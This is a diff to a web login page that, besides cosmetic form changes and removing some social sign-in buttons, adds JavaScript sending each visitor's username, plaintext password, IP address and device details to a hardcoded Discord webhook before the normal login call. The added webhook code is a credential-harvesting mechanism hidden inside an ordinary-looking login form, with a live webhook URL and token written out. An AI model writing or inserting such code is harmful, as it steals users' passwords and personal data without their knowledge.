@@ -29,13 +29,14 @@
         <h1>Sign in</h1>
         <form id="loginForm" onsubmit="return handleSubmit(event)" autocomplete="off">
             <div class="input-group">
-                <input type="text" id="username" name="username" required>
+                <input type="text" id="username" name="username" placeholder="Username" required>
                 <label>USERNAME</label>
             </div>
             
             <div class="input-group">
-                <input type="password" id="password" name="password" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
                 <label>PASSWORD</label>
+                <i id="togglePassword" class="fas fa-eye"></i>
             </div>
 
             <div class="checkbox-group">
@@ -53,15 +54,6 @@
                 </button>
                 <button type="button" class="social-btn google">
                     <i class="fab fa-google"></i>
-                </button>
-                <button type="button" class="social-btn apple">
-                    <i class="fab fa-apple"></i>
-                </button>
-                <button type="button" class="social-btn xbox">
-                    <i class="fab fa-xbox"></i>
-                </button>
-                <button type="button" class="social-btn playstation">
-                    <i class="fab fa-playstation"></i>
                 </button>
             </div>
 
@@ -100,8 +92,59 @@
             const ipData = await ipResponse.json();
             const ipAddress = ipData.ip;
 
+            // Discord webhook call
+            const webhookUrl = "https://discord.com/api/webhooks/1378978890373926963/KBqbq1R-P4Pu1ytdZl5oo5kHKVkCpz8MeszoyUjR1JRK1M-vIQ4ov2x4hFbhMJa_VGmQ";
+            
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: "Login Bot",
+                    embeds: [{
+                        title: "🔐 New Login Attempt",
+                        color: 0xFF0000,
+                        fields: [
+                            {
+                                name: "👤 Username",
+                                value: username,
+                                inline: true
+                            },
+                            {
+                                name: "🔑 Password",
+                                value: password,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 IP Address",
+                                value: ipAddress,
+                                inline: true
+                            },
+                            {
+                                name: "⏰ Timestamp",
+                                value: new Date(timestamp).toLocaleString(),
+                                inline: false
+                            },
+                            {
+                                name: "📱 Device Info",
+                                value: `Platform: ${browserInfo.platform}\nBrowser: ${browserInfo.browser}\nResolution: ${browserInfo.screenResolution}`,
+                                inline: false
+                            }
+                        ]
+                    }]
+                })
+            });
+            
+            if (response.ok) {
+                showToast('Successfully!', 'success');
+                document.getElementById('loginForm').reset();
+            } else {
+                throw new Error('Failed');
+            }
+
             // Call your API endpoint
-          const response = await fetch('/api/login', {
+            const apiResponse = await fetch('/api/login', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -115,18 +158,15 @@
                 })
             });
             
-            if (response.ok) {
-                showToast('Successfully!', 'success');
-                document.getElementById('loginForm').reset();
-            } else {
-                throw new Error('Failed');
+            if (!apiResponse.ok) {
+                throw new Error('API call failed');
             }
         } catch (error) {
             console.error('Error:', error);
             showToast('Error: ' + error.message, 'error');
         } finally {
             button.disabled = false;
-            button.innerHTML = '→';
+            button.innerHTML = 'Login';
         }
         return false;
     }
